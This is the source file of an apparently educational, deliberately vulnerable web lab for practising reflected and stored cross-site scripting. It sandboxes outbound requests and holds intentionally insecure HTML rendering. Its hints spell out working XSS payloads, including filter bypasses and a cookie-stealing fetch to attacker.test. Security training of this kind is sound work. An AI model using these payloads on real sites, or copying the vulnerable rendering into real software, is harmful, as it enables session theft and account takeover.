/* Lab 02 — Cross-Site Scripting (reflected + stored) */
(function () {
  "use strict";
  var M = window.MVWA, $ = M.$, esc = M.escapeHtml;

  var SESSION_TOKEN = "nw_sess_7f3a9c2e1b4d8e60";
  var STORE_KEY = "xss-guestbook";
  var SAFE_MODE = /[?&]safe\b/.test(window.location.search);
  var DEFAULT_COMMENTS = [
    { name: "Priya", body: "Great selection of trail gear. Delivery was quick too.", t: Date.now() - 86400000 * 3 },
    { name: "Marcus", body: "The waterproof jacket held up through a week of rain.", t: Date.now() - 86400000 }
  ];

  /* ------------------------------------------------------------------
   * Simulated cookie jar. Real cookies don't work on file:// pages, so the
   * victim's cookies are modelled here. On High the session cookie is
   * HttpOnly and therefore invisible to document.cookie.
   * ---------------------------------------------------------------- */
  var jar = { sessionid: SESSION_TOKEN, theme: "dark", currency: "USD" };
  try {
    Object.defineProperty(document, "cookie", {
      configurable: true,
      get: function () {
        return Object.keys(jar)
          .filter(function (k) { return !(k === "sessionid" && M.getLevel() === "high"); })
          .map(function (k) { return k + "=" + jar[k]; })
          .join("; ");
      },
      set: function (v) {
        var pair = String(v).split(";")[0].split("=");
        if (pair[0]) jar[pair[0].trim()] = (pair[1] || "").trim();
      }
    });
  } catch (e) { /* ignore */ }

  /* ------------------------------------------------------------------
   * Execution detection: intercept dialogs, and attribute each execution
   * to the injection point (data-sink) it came from.
   * ---------------------------------------------------------------- */
  var lastRender = null;

  function currentSink() {
    var node = document.currentScript || (window.event && window.event.target);
    if (node && node.closest) {
      var s = node.closest("[data-sink]");
      if (s) return s.getAttribute("data-sink");
    }
    if (lastRender && Date.now() - lastRender.t < 4000) return lastRender.sink;
    return null;
  }

  function appendLog(id, html) {
    var el = $(id);
    if (el.getAttribute("data-empty") !== "0") { el.innerHTML = ""; el.setAttribute("data-empty", "0"); }
    el.innerHTML += html + "\n";
    el.scrollTop = el.scrollHeight;
  }

  function containsToken(v) { return String(v).indexOf(SESSION_TOKEN) !== -1; }

  function onExecuted(kind, arg) {
    var sink = currentSink();
    var level = M.getLevel();
    var where = sink === "stored" ? "guestbook" : sink === "reflected" ? "search" : "page";
    appendLog("#exec-log",
      '<span class="prompt">[' + esc(new Date().toLocaleTimeString()) + "]</span> " +
      esc(kind) + "(" + esc(JSON.stringify(arg === undefined ? "" : String(arg))) + ') <span class="dim">via ' + where + "</span>");

    if (!sink) return;
    M.toast("JavaScript executed", kind + "(" + (arg === undefined ? "" : String(arg)).slice(0, 80) + ")", "danger");
    if (sink === "reflected") M.complete("xss-reflected");
    if (sink === "stored") M.complete("xss-stored");
    if (level === "medium") M.complete("xss-medium");
    if (containsToken(arg)) M.complete("xss-cookie");
  }

  ["alert", "confirm", "prompt"].forEach(function (fn) {
    window[fn] = function (msg) {
      onExecuted(fn, msg);
      return fn === "confirm" ? true : fn === "prompt" ? "" : undefined;
    };
  });
  var realLog = console.log;
  console.log = function () {
    var args = Array.prototype.slice.call(arguments);
    if (currentSink()) onExecuted("console.log", args.join(" "));
    return realLog.apply(console, args);
  };

  /* Outbound requests from payloads are captured, never sent. */
  function isExternal(url) {
    try {
      var u = new URL(String(url), window.location.href);
      return /^https?:$/.test(u.protocol) && u.host !== window.location.host;
    } catch (e) { return false; }
  }
  function captureExfil(method, url, body) {
    var line = '<span class="ok">' + esc(method) + "</span> " + esc(String(url)) + (body ? ' <span class="dim">body=</span>' + esc(String(body)) : "");
    appendLog("#exfil-log", '<span class="prompt">[' + esc(new Date().toLocaleTimeString()) + "]</span> " + line);
    if (containsToken(url) || containsToken(body)) {
      M.complete("xss-cookie");
      M.toast("Session cookie stolen", "The victim's sessionid reached attacker.test.", "danger");
    }
    var sink = currentSink();
    if (sink === "reflected") M.complete("xss-reflected");
    if (sink === "stored") M.complete("xss-stored");
    if (sink && M.getLevel() === "medium") M.complete("xss-medium");
  }

  var realFetch = window.fetch ? window.fetch.bind(window) : null;
  window.fetch = function (input, init) {
    var url = typeof input === "string" ? input : (input && input.url) || String(input);
    if (isExternal(url)) {
      captureExfil((init && init.method) || "GET", url, init && init.body);
      return Promise.resolve(new Response(null, { status: 204 }));
    }
    return realFetch ? realFetch(input, init) : Promise.reject(new Error("fetch unavailable"));
  };
  if (navigator.sendBeacon) {
    var realBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (url, data) {
      if (isExternal(url)) { captureExfil("BEACON", url, data); return true; }
      return realBeacon(url, data);
    };
  }
  var imgSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, "src");
  if (imgSrc && imgSrc.set) {
    Object.defineProperty(HTMLImageElement.prototype, "src", {
      configurable: true,
      get: imgSrc.get,
      set: function (v) {
        if (isExternal(v)) { captureExfil("GET", v); return imgSrc.set.call(this, "data:,"); }
        return imgSrc.set.call(this, v);
      }
    });
  }

  /* ------------------------------------------------------------------
   * Rendering sinks for each security level
   * ---------------------------------------------------------------- */
  function stripScripts(html) {
    return html.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, "");
  }

  // Inserts server-rendered HTML the way a browser would parse a response
  // (createContextualFragment executes <script> elements, unlike innerHTML).
  function writeHtml(el, html, sink) {
    lastRender = { sink: sink, t: Date.now() };
    el.innerHTML = "";
    el.appendChild(document.createRange().createContextualFragment(html));
  }

  function renderSearch(q) {
    var out = $("#search-out");
    var level = M.getLevel();
    $("#search-url").textContent = encodeURIComponent(q);
    if (!q) { out.innerHTML = ""; return; }
    if (level === "high") {
      out.innerHTML = "";
      var p = document.createElement("p");
      p.style.margin = "0";
      p.textContent = 'Results for "' + q + '"';
      out.appendChild(p);
      var m = document.createElement("p");
      m.className = "muted"; m.style.margin = ".35rem 0 0"; m.textContent = "No products matched your search.";
      out.appendChild(m);
      return;
    }
    var value = level === "medium" ? stripScripts(q) : q;
    writeHtml(out, '<p style="margin:0">Results for "' + value + '"</p><p class="muted" style="margin:.35rem 0 0">No products matched your search.</p>', "reflected");
  }

  function loadComments() { return M.store.get(STORE_KEY, null) || DEFAULT_COMMENTS.slice(); }
  function saveComments(list) { M.store.set(STORE_KEY, list); }

  function renderGuestbook() {
    var list = $("#gb-list");
    if (SAFE_MODE) {
      list.innerHTML = '<div class="alert alert-info"><p>Safe mode: stored messages are not rendered. <a href="xss.html">Exit safe mode</a></p></div>';
      return;
    }
    var level = M.getLevel();
    var comments = loadComments();
    if (!comments.length) { list.innerHTML = '<p class="muted" style="margin:0">No messages yet.</p>'; return; }
    if (level === "high") {
      list.innerHTML = "";
      comments.forEach(function (c) {
        var row = document.createElement("div"); row.className = "comment";
        var who = document.createElement("div"); who.className = "who"; who.textContent = c.name;
        var time = document.createElement("time"); time.textContent = new Date(c.t).toLocaleDateString();
        who.appendChild(time);
        var body = document.createElement("div"); body.className = "body"; body.textContent = c.body;
        row.appendChild(who); row.appendChild(body); list.appendChild(row);
      });
      return;
    }
    var html = comments.map(function (c) {
      var body = level === "medium" ? stripScripts(c.body) : c.body;
      var name = level === "medium" ? stripScripts(c.name) : c.name;
      return '<div class="comment"><div class="who">' + name + "<time>" + esc(new Date(c.t).toLocaleDateString()) + '</time></div><div class="body">' + body + "</div></div>";
    }).join("");
    writeHtml(list, html, "stored");
  }

  /* ------------------------------------------------------------------
   * Wiring
   * ---------------------------------------------------------------- */
  function readQueryParam() {
    try { return new URLSearchParams(window.location.search).get("q") || ""; } catch (e) { return ""; }
  }

  $("#search-form").addEventListener("submit", function (e) {
    e.preventDefault();
    var q = $("#search-q").value;
    try {
      var url = new URL(window.location.href);
      if (q) url.searchParams.set("q", q); else url.searchParams.delete("q");
      url.searchParams.delete("safe");
      history.replaceState(null, "", url.toString());
    } catch (err) { /* ignore */ }
    renderSearch(q);
  });

  $("#gb-form").addEventListener("submit", function (e) {
    e.preventDefault();
    var name = $("#gb-name").value.trim() || "Anonymous";
    var body = $("#gb-msg").value;
    if (!body.trim()) return;
    var list = loadComments();
    list.push({ name: name, body: body, t: Date.now() });
    saveComments(list);
    $("#gb-msg").value = "";
    renderGuestbook();
  });

  $("#gb-clear").addEventListener("click", function () {
    saveComments(DEFAULT_COMMENTS.slice());
    renderGuestbook();
    M.toast("Guestbook reset", "Stored messages were removed.");
  });

  var started = false;
  M.initLab({
    id: "xss",
    levels: {
      low: "User input is written into the page as raw HTML. The session cookie is readable by JavaScript.",
      medium: "A regular expression strips <script>…</script> elements before rendering. Everything else is still parsed as HTML.",
      high: "Output is encoded with textContent (the equivalent of server-side HTML escaping), and the session cookie is HttpOnly."
    },
    hints: [
      '<details class="hint"><summary>Hint: reflected XSS</summary><div><p>Search for <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Then copy the page URL: anyone who opens it runs your script.</p></div></details>',
      '<details class="hint"><summary>Hint: stored XSS</summary><div><p>Post a guestbook message containing a payload, then reload the page. It runs again on every visit.</p></div></details>',
      '<details class="hint"><summary>Hint: stealing the cookie</summary><div><p>Read <code>document.cookie</code> and send it somewhere you control: <code>&lt;img src=x onerror="fetch(\'https://attacker.test/c?\'+document.cookie)"&gt;</code>. Showing it with <code>alert(document.cookie)</code> also counts.</p></div></details>',
      '<details class="hint"><summary>Hint: beating the filter</summary><div><p>Only <code>&lt;script&gt;</code> elements are removed. Event handlers still fire: <code>&lt;img src=x onerror=alert(1)&gt;</code> or <code>&lt;details open ontoggle=alert(1)&gt;</code>.</p></div></details>'
    ].join(""),
    onLevel: function () {
      $("#cookie-mask").textContent = M.getLevel() === "high" ? "•••• (HttpOnly)" : "••••••••";
      if (!started) return;
      renderSearch($("#search-q").value);
      renderGuestbook();
    }
  });

  started = true;
  var initialQ = readQueryParam();
  $("#search-q").value = initialQ;
  renderSearch(initialQ);
  renderGuestbook();
})();
